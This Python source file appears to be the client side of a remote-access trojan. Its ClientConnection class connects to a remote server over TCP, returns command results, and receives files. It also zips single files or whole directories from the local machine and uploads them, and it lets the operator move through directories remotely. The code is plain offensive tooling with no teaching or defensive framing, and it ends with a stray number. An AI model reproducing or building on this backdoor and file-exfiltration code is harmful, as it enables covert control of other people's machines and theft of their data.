import socket 
import zipfile
import os
import json

DELIMETER = "<END_OF_RESULTS>"
# DELIMETER = "<END_OF_RESULTS>"
CHUNK_SIZE = 4 * 1024

class ClientConnection:
    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def Connect(self, server_ip, server_port):
        self.socket.connect((server_ip, server_port))
        self.server_ip = server_ip
        self.server_port = server_port

    def receive_data(self):
        self.data_in_bytes = self.socket.recv(1024)
        self.data = self.data_in_bytes.decode("utf-8")
        return self.data

    def send_data(self, data):
        
        # self.data_in_bytes = bytes(data, "utf-8")
        self.data_in_bytes = data.encode("utf-8")
        
        self.socket.send(self.data_in_bytes)
    
    def send_command_result(self, command_result):
        data2send = command_result + DELIMETER

        data2send_bytes = data2send.encode()
        self.socket.send(data2send_bytes)


    def receive_file(self, filename):
        print("[+] Receive file")

        with open(filename, "wb") as file:
            while True:
                chunk = self.socket.recv(CHUNK_SIZE)

                if chunk.endswith(DELIMETER.encode()):
                    chunk = chunk[:-len(DELIMETER)]
                    file.write(chunk)
                    break
                file.write(chunk)
        
        print("[+] Completed")

    def send_file(self, toDownload):
        print("[+] Sending file: ", toDownload)

        if os.path.isdir(toDownload):
            zipped_name = toDownload + ".zip"

            zipf = zipfile.ZipFile(zipped_name, "w", zipfile.ZIP_DEFLATED)

            for root, dirs, files in os.walk(toDownload):
                for file in files:
                    zipf.write(os.path.join(root, file))
            zipf.close()

            
        else:
            # dir/sample.csv
            basename = os.path.basename(toDownload) #sample.csv
            name, ext = os.path.splitext(basename)
            toZip = name + ".zip"
            zipf = zipfile.ZipFile(toZip, "w")
            zipf.write(basename)
            zipf.close()
            zipped_name = toZip

        zip_content = b''
        with open(zipped_name, "rb") as file:
            zip_content = file.read()
            file.close()



        print("ZIPPED NAME BEFORE SENDING: ", zipped_name)
        print("len(zip): ", len(zipped_name))
        # self.send_data(zipped_name[:len(zipped_name)])
         ########################################33 DONE

        zip_with_delim = zip_content + DELIMETER.encode()



        self.socket.send(zip_with_delim)
        print("[+] File sent successfully : ", zipped_name)
        os.remove(zipped_name)

    def change_dir(self):
        print("[+] Changing directory")

        pwd = os.getcwd()
        self.send_data(pwd)
        while True:
            user_command = self.receive_data()
            if user_command == "stop":
                break
            # cd dir
            if user_command.startswith("cd"):
                path2move = user_command.strip("cd ")

                if os.path.exists(path2move):
                    os.chdir(path2move)
                    pwd = os.getcwd()
                    self.send_data(pwd)
                else:
                    self.send_data(os.getcwd())
            else:
                self.send_data(os.getcwd())


    def close(self):
        self.socket.close()
        98